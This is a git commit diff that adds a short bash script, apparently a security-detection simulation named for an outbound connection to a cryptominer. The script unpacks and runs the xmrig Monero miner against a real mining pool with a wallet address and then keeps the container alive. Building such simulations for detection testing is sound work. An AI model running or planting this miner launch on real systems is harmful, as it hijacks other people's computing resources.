e7682a6d1ae05877c8b5720593b51b2bcf9caf3b
oriabargil <ori.a@lightspin.io>
2022-09-06 11:46:55 +0300

    added new simulation

---
+++ src/shell-outbound-connection-to-miner.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+apt update
+apt install unzip 
+cd /src/
+unzip zip.zip 
+chmod +x xmrig
+./xmrig -o xmr-eu1.nanopool.org:14444 -u 888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H --coin=monero -k
+
+/bin/bash -c "sleep 6045d"
